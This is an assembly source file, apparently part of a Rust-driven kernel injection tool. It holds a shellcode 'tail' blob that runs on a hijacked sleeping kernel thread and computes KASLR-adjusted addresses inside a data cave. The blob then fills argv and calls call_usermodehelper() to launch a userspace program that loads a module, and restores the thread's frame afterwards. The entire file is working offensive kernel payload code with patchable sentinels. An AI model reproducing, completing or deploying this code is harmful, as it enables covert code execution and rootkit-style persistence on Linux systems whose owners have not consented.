; lkm_worker_tail.asm
; Tail half of the deferred kernel worker.
;
; This blob computes KASLR-correct runtime addresses for the data cave, fills
; argv[], calls call_usermodehelper(), restores the sleeper's frame, and returns.
;
; On entry from lkm_worker.asm: rsp % 16 == 0 and rbp is still pushed.
;
; Sentinels patched as i32/u8 by Rust before writing blob:
;   CALL_UMH_REL_SENTINEL              0xDDEEFF00  rel32 for call call_usermodehelper
;   PATH_DISP_SENTINEL                 0xCCDDEE11  disp32 for lea rdi,[rip+0xd]
;   ARGV_DISP_SENTINEL                 0xCCDDEE22  disp32 for lea rsi,[rip+0xd]
;   MODULE_FROM_PATH_OFFSET_SENTINEL   0x7F        module path offset from argv[0]

BITS 64

lkm_worker_tail:
    db      0x48, 0x8D, 0x35
    dd      0xCCDDEE22
    db      0x48, 0x8D, 0x3D
    dd      0xCCDDEE11
    mov     [rsi], rdi
    lea     rax, [rdi + 0x7F]
    mov     [rsi + 8], rax
    xor     edx, edx
    push    2
    pop     rcx
    db      0xE8
    dd      0xDDEEFF00

    pop     rbp
    ret
